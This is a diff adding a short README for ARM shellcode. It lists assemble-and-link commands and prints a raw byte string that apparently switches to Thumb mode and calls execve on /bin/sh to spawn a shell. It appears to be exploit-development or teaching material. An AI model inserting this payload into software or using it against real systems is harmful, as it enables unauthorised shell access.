@@ -1,0 +1,8 @@
+# ARM Shellcode
+
+To produce binary, assemble and link shellcode.s file:
+`as shellcode.s -o shellcode.o`
+`ld -N shellcode.o -o shellcode`
+
+Raw shellcode:
+`\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\xa0\x49\x1a\x92\x1a\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58`
